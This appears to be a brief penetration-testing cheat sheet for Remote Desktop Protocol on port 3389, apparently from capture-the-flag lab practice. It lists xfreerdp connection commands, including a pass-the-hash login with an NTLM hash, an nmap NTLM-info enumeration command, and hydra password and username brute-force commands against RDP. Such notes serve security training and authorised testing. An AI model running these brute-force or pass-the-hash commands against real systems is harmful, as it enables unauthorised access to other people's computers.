- - -
**Default port:** 3389
**Remote Desktop** Protocol (**RDP**) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection.
- - -
### Accessing : 

```sh
xfreerdp /u:admin /pth:<NTLM-hash-of-user-admin-pass> /v:$IP /cert-ignore /dynamic-resolution
```

```sh
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.147.80 /workarea
```

```sh
xfreerdp /u:administrator /g:grandbussiness /p:bla /v:192.168.1.34
```

```sh
xfreerdp /d:THM /u:Administrator /p:Password321 /v:10.10.158.14 /dynamic-resolution
```

```sh
rdesktop $IP
```

- - -

### Enumeration : 

```sh
nmap -p 3389 --script rdp-ntlm-info $IP
```

- - -

### BruteForcing : 

For Password : 
```sh
hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
```

For User : 
```sh
hydra -V -f -L user.txt -P dict.txt rdp://$IP
```

- - -
